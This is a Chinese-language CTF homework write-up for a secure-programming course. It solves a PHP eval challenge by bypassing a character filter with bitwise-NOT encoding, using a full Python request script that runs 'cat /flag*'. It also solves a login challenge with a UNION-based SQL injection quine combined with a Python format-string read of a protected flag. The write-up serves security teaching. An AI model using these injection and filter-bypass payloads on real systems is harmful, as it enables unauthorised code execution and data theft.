###### tags: `程式安全`
# Secure Programming HW5 Writeup
## (#°д°)
### 解法：
首先看一下網站給的php code，我們可以知道如果能通過長度與正規式的檢查就可以用eval跑我們的code
```php=
<?=highlight_file(__FILE__)&&strlen($🐱=$_GET['(#°д°)'])<0x20&&!preg_match('/[a-z0-9`]/i',$🐱)&&@eval($🐱);
```
那爬文一下後找到了xor的方法，只要事先把想執行的指令轉成兩組非英文跟數字的string做xor就好了
可是用這個方法最多只能做到system(ls);就到長度限制了
除了phpinfo()之外，應該一定要用system才會有回顯，所以只能換一種方法

仔細再看一次題目後發現裡面其實有提示
>string type in PHP supports a lot of operators

查了一下operator後找到php有一種~的operator，作用是bitwise not，也就是只要用兩次就會變回來，跟xor有異曲同工之妙，而且payload的長度直接少一半左右

接著使用python寫request的腳本，但是因為python的~是針對int的bitwise not，所以先把cmd跟parameter從bytes轉成int，經過bitwise not後再轉回bytes
之後把cmd跟parameter接起來用括弧包住再加上~，在執行時就會還原了
合起來長這樣：
```
(~cmd)(~parameter);
```
那處理完長度與正規式的檢查就可以來想flag會放在哪了
先試了上課曾經用過的cat /flag*，沒想到就中了XD

下面是我request用的完整腳本：
```python=
import requests
import urllib

test_func = b'system'
test_func_not = ~int.from_bytes(test_func,'big')
len1 = len(test_func)
function = test_func_not.to_bytes(len1,'big',signed=True)
print(function)
test_param = b'cat /flag*'
test_param_not = ~int.from_bytes(test_param,'big')
len2 = len(test_param)
param = test_param_not.to_bytes(len2,'big',signed=True)

#values = {'(#°д°)':b'(~'+function+b')(~' + param + b');'}
#data = urllib.parse.urlencode(values)
#print(data)
#url = 'https://php.splitline.tw/?' + data
#r = requests.get(url)
param = {'(#°д°)': b'(~'+function+b')(~' + param + b');'}
r = requests.get('https://php.splitline.tw',params=param)
print(r.text)
```
## VISUAL BASIC 2077
### 解法：
首先看一下題目給的source code，確定裡面有sql injection漏洞
但是後面的判斷式限定query回傳的username與password要跟輸入的username與password一樣
也就是你使用正常的sql injection語法是行不通的QQ
```python=
query = f"select username, password from users where username='{username}' and password='{password}'"
    cursor.execute(query)
    res = cursor.fetchone()

    if res != None and res['username'] == username and res['password'] == password:
        return ("<h1>Hello, " + username + " ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} ").format(flag=flag)
```
卡住的時候就要看hintXD
從助教給的第一個hint中得知要去看/hint在幹麻，發現hint這個function會印出它function裡面的內容
查了一下這種東西叫做quine，中文是自產生程式，指的是輸出結果為程式自身原始碼的程式
接著使用下面這個網站的sql injection quine的模板來做修改
https://mineta.tistory.com/56
接下來研究注入的payload，使用union-based的方法在帳號中注入，並把後面的' and password=''註解掉
union要讓欄位數一樣，users有兩個欄位，第一個塞quine，因為我們要在帳號中注入，而第二個放你要輸入的密碼，這樣就可以讓回傳的password也跟輸入的一樣
把quine的部份省略長這樣：
```sql=
' UNION SELECT QUINE AS username, 'dog' -- '
```
加上quine後成功登入的帳號跟密碼如下：
username:
```sql=
' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS username, "dog" -- "',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS username, "dog" -- "') AS username, 'dog' -- '
```
password: 
dog

登入後卻發現flag沒有出現O_O
![](https://i.imgur.com/AIJcUKO.png)
檢查一下source code裡面回傳了什麼東西，發現它把username跟flag塞進h1 tag中的string回傳
```python=
return ("<h1>Hello, " + username + " ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} ").format(flag=flag)
```
再看一下flag裡面寫了什麼，看到被當成string的時候is_admin的session要是true才會回傳正確的flag
```python=
class Flag():
    def __init__(self, flag):
        self.flag = flag
    def __str__(self):
        return self.flag if session.get('is_admin', False) else "Oops, You're not admin (・へ・)"
```
原本在想要怎麼改session的is_admin，不過提示裡有講歡迎語句有問題，便開始研究有啥問題
仔細檢查之後想到username的部份是可控的，再查了format string的用法發現{}裡面可以access class的variable，也就是可以直接access flag.flag
而sql註解的後面塞什麼東西都不會影響，所以多塞個{flag.flag}就可以了
加上{flag.flag}的帳號payload如下，密碼一樣還是dog：
```sql=
' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS username, "dog" -- {flag.flag}"',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS username, "dog" -- {flag.flag}"') AS username, 'dog' -- {flag.flag}'
```
登入後就可以在歡迎語句裡面看到flag了
![](https://i.imgur.com/lBj3yZQ.png)
flag如下：
```
FLAG{qu1n3_sq1_1nj3ct10nnn.__init__}
```
